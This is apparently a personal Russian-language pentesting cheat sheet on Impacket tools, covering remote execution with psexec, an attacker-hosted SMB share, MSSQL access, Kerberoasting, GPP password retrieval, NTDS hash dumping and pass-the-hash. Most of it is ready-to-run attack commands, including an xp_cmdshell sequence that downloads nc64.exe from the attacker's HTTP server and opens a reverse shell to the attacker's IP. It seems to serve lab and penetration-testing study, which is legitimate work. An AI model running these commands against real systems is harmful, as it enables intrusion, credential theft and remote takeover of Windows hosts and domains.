## Введение
Impacket представляет собой коллекцию классов Python для работы с сетевыми протоколами. Impacket ориентирован на обеспечение низкоуровневого программного доступа к пакетам, а для некоторых протоколов (например, SMB1-3 и MSRPC) — на саму реализацию протокола. Пакеты могут быть сконструированы с нуля, а также разобраны из необработанных данных, а объектно-ориентированный API упрощает работу с глубокими иерархиями протоколов. Библиотека предоставляет набор инструментов в качестве примеров того, что можно сделать в контексте этой библиотеки.
```
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .
# OR:
sudo python3 setup.py install
# In case you are missing some modules:
pip3 install -r requirements.txt
```
Теперь мы готовы узнать об использовании инструмента и, в частности, mssqlclient.py скрипта.
## Подключиться к windows
impacket-psexec - `impacket-psexec '{domain}/{username}:{pass}@{IP}'
`
impacket-wmiexec
impacket-smbexec
## SMB
### Передать файл через SMB (развернуть SMB сервер)
```
impacket-smbserver -smb2support public mydir
```
где `mydir` - директория на атакующем компьютере

Команда выше создает на нашем хосте SMB-сервер с поддержкой SMB2, на котором размещена шара public, которую мы маппим с директорией mydir на атакующем хосте.

Для копирования файла или директории на сервере достаточно просто воспользоваться встроенным функционалом операционной системы: \
``` 
copy \\<ATTACKER_IP>\public\{myfile.txt}
```

этот же сервер можно использовать совместно с [[mitm6]], чтобы красть аутентификационные данные пользователей.

---
## mySQL
```
cd impacket/examples/
python3 mssqlclient.py -h
```
Пример подключения к **MSSQL**:
```
python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
```
где `-windows-auth` - флаг указан для использования проверки подлинности Windows
Для взлома MSSQL полезен ресурс: [MSSQL Injection Cheat Sheet | pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
Например благодаря нему можно использовать следующие команды для получения доступа к windows машине:
``` 
EXEC xp_cmdshell 'net user';
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

У себя:
python -m http.server 80
nc -lvnc 443

Снова в MSSQL:
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://<my python IP>/nc64.exe -outfile nc64.exe"

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe <my nc IP> 443"
```
Пример подключения к машине windows (из соответствующей папки impacket):
```
python3 psexec.py <login>@{TARGET_IP}
```
## TGS / SPN / Remote Management Users
![[Pasted image 20240531151613.png]]
Если мы знаем, что какой-то пользователь в **Active Directory** имеет право на подключение к контроллеру домену при помощи **WinRM**, то мы можем завладеть его учётной записью из-за того, что эта учетная запись подвержена атаке **Kerberoasting**.

``` 
impacket-GetUserSPNs -request -dc-ip {IP} {domain}/{username}:'userpassword' -outputfile kerberoastable.txt
```
![[Pasted image 20240531152547.png]]
Мы получаем зашифрованный **TGS**, а также видим, что учетная запись **dsemenov** действительно подвержена атаке и состоит в группе **Remote Management Users**, что даёт ей право подключаться по **WinRM**. 

Итог: атаки на пользователей windows:
```
impacket-GetUserSPNs {domain}/{username}:{pass} -dc-ip {IP}
```
```
impacket-Get-GPPPassword {domain}/{username}:{pass}@{IP}
```

# NTDS
### Анализ 
``` 
secretsdump.py -ntds /путь/к/файлу/ntds.dit -system /путь/к/файлу/SYSTEM LOCAL
```
`LOCAL` - указывает дампить локально. Также можно дампить и удалённо, имя аутентификационные данные.

Вывод:
```
{userName}:{userID}:{LM HASH от пустого пароля(у всех одинаковый)}:{NTLM HASH}:::
```
### Атака
```
secretsdump.py -hashes :{HASH} '{domain/{userName}@{IP}'
```
Машинные учётные записи именуются в виде `{имя компьютера}$`